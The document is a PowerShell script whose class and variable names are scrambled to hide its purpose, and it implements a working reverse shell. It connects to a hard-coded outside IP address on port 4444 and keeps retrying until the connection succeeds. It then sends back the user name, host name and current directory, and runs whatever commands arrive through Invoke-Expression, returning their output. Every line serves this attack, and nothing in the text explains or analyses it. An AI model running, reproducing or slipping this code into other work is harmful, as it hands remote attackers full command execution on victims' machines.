class GfHSymWHzJvKbNYcVW {
    
    [string]$zPjxOQSAPhLACxIFFKITlQEA = "93.49.240.195"
    [int]$ZWVwjAyHMnHglE = 4444

    $SEBzWlKq
    $NaMTgbpn
    $dMyiPKqxgsyIorGvsUR
    $SGIYHObcsmkakLcOONSdOt
    $McoBOcZjqFLVSorOR
    $rcmdWkgtUrNhHynNbss
    [int]$YLkhKNZHXTIzpIRuo = 50*1024

    eRvYUslw() {
        $this.NaMTgbpn = $false
        while ($true) {
            try {
                $this.NaMTgbpn = New-Object Net.Sockets.TcpClient($this.zPjxOQSAPhLACxIFFKITlQEA, $this.ZWVwjAyHMnHglE)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.YqeScyQEUpafiFw()
    }

    YqeScyQEUpafiFw() {
        $this.SEBzWlKq = $this.NaMTgbpn.GetStream()
        $this.SGIYHObcsmkakLcOONSdOt = New-Object Byte[] $this.YLkhKNZHXTIzpIRuo
        $this.rcmdWkgtUrNhHynNbss = New-Object Text.UTF8Encoding
        $this.dMyiPKqxgsyIorGvsUR = New-Object IO.StreamWriter($this.SEBzWlKq, [Text.Encoding]::UTF8, $this.YLkhKNZHXTIzpIRuo)
        $this.McoBOcZjqFLVSorOR = New-Object System.IO.StreamReader($this.SEBzWlKq)
        $this.dMyiPKqxgsyIorGvsUR.AutoFlush = $true
    }

    KDSQVYYgKwHxFMLAlTcd() {
        $this.eRvYUslw()
        $this.hTVnjNgodzVbxGuOGAZyCA()
    }

    QHdpLoRAqzFayBzqjBCDf($maqGsJICWhVAfChmfJBq) {
        try {
            [byte[]]$XLoWgAe = [text.Encoding]::Ascii.GetBytes($maqGsJICWhVAfChmfJBq)
            $this.dMyiPKqxgsyIorGvsUR.Write($XLoWgAe, 0, $XLoWgAe.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.KDSQVYYgKwHxFMLAlTcd()
        }
    }

    [string] WzMhVbQTHcdCwYq() {
        try {
            $pmrvBVofVjTCAUQPvRfvGUP = $this.SEBzWlKq.Read($this.SGIYHObcsmkakLcOONSdOt, 0, $this.YLkhKNZHXTIzpIRuo)    
            $LHofSuAjxYAYFgAOjfYFx = ($this.rcmdWkgtUrNhHynNbss.GetString($this.SGIYHObcsmkakLcOONSdOt, 0, $pmrvBVofVjTCAUQPvRfvGUP))
            return $LHofSuAjxYAYFgAOjfYFx
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.KDSQVYYgKwHxFMLAlTcd()
            return ""
        }
    }

    [string] hloftKudqZbJyzUiK($IxTuetdSC) {
        Write-Host $IxTuetdSC
        try { 
            $FcXWumdMCZlZcWHLG = Invoke-Expression $IxTuetdSC | Out-String
        }
        catch {
            $vFZGcOKcGOyfqfNkpMpkon = $_.Exception
            $AiHrRNucoqfQdyFTOlp = $_.Message
            $FcXWumdMCZlZcWHLG = "`n$_`n"
        }
        return $FcXWumdMCZlZcWHLG
    }

    [string] KGZBDZrxFaqTxVsRHTeeTUF() {
        $obRXQCoKVKbenU = [Environment]::UserName
        $KoedKbLUUUwcLBKtZ = [System.Net.Dns]::GetHostName()
        $uYjeg = Get-Location
        return "$obRXQCoKVKbenU@$KoedKbLUUUwcLBKtZ [$uYjeg]~$ "
    }

    hTVnjNgodzVbxGuOGAZyCA() {
        while ($this.NaMTgbpn.Connected) {
            $this.QHdpLoRAqzFayBzqjBCDf($this.KGZBDZrxFaqTxVsRHTeeTUF())         
            $LHofSuAjxYAYFgAOjfYFx = $this.WzMhVbQTHcdCwYq()
            $FcXWumdMCZlZcWHLG = "`n"
            if ([string]::IsNullOrEmpty($LHofSuAjxYAYFgAOjfYFx)) {
                continue
            }
            $FcXWumdMCZlZcWHLG = $this.hloftKudqZbJyzUiK($LHofSuAjxYAYFgAOjfYFx)
            $this.QHdpLoRAqzFayBzqjBCDf($FcXWumdMCZlZcWHLG + "`n")
            $this.SEBzWlKq.Flush()
        }
        $this.NaMTgbpn.Close()
        $this.KDSQVYYgKwHxFMLAlTcd()
    } 
}

$BfbjW = [GfHSymWHzJvKbNYcVW]::new()
$BfbjW.KDSQVYYgKwHxFMLAlTcd()
